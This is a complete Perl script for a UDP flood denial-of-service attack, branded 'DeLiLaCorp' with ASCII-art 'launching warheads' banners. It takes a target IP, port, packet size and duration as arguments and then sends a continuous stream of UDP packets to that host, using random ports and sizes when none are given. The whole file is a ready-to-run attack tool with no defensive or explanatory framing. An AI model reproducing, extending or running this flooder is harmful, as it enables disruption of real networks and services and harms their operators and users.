#!/usr/bin/perl

#########
# Ace   #
#########

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Invalid Command $ip\n";
$endtime = time() + ($time ? $time : 1000);

socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;

██████╗ ███████╗██╗     ██╗██╗      █████╗  ██████╗ ██████╗ ██████╗ ██████╗ 
██╔══██╗██╔════╝██║     ██║██║     ██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔══██╗
██║  ██║█████╗  ██║     ██║██║     ███████║██║     ██║   ██║██████╔╝██████╔╝
██║  ██║██╔══╝  ██║     ██║██║     ██╔══██║██║     ██║   ██║██╔══██╗██╔═══╝ 
██████╔╝███████╗███████╗██║███████╗██║  ██║╚██████╗╚██████╔╝██║  ██║██║     
╚═════╝ ╚══════╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     
                                                                            

> # LAUNCHING WARHEADS # <

EOTEXT

print "~DeLiLaCorp Launched Warheads at~ $ip " . ($port ? $port : "on random ports") . " 
DeLiLaCorp just launched warheads with " .
  ($size ? "$size-bytes" : "a random packetsize") . " 
The warheads will hit for " .
  ($time ? " for $time seconds" : "") . "\n";
print "To stop the attack type Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(65000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, 
$iaddr));}